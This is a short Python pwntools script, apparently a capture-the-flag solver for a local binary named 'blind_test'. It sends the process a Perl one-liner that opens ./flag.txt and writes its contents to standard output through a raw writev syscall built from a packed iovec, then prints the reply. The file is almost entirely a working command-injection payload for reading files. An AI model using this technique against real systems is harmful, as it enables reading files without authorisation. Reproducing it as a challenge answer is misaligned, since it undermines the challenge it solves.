from pwn import *
import sys

binary = "./blind_test_patched" if len(sys.argv) > 1 and '-p' in sys.argv else "./blind_test"

r = process(binary)
context.log_level = 'error'

f = '''open my $fh, "<", "./flag.txt";
my $file_content = do {local $/; <$fh>};
my @buffers = ($file_content, "\n");
my $iovec = pack("L!L!L!L!L!L!",
    map { 
        my $str = $_;
        my $ptr = unpack("L!", pack("P", $str));
        my $len = length($str);
        ($ptr, $len)
    } @buffers
);
my $fd = fileno(STDOUT);
my $ret = syscall(20, $fd, $iovec, scalar(@buffers));'''

payload = f.replace('\n', '')
cmd = f"perl -e '{payload}'"

r.sendline(cmd)
print(r.recv(timeout=1).decode())